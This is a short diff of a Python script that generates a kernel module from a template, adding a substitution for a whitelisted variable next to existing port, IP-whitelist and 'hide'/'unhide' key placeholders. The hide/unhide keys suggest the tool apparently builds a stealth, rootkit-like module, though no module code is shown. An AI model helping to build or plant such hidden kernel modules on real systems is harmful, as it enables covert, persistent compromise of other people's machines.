@@ -26,6 +26,7 @@ print ("\n Generate Kernel module \n")
 source=template_content
 source=source.replace("PUBLIC_PORTS",v['public_ports'])
 source=source.replace("IP_WHITELISTED",v['whitelist_code'])
+source=source.replace("VAR_WHITELISTED",v['whitelist_var'])
 source=source.replace("PORTS_COUNT",v['open_port_count'])
 source=source.replace("UNHIDE_KEY",v['unhide_key'])
 source=source.replace("HIDE_KEY",v['hide_key'])
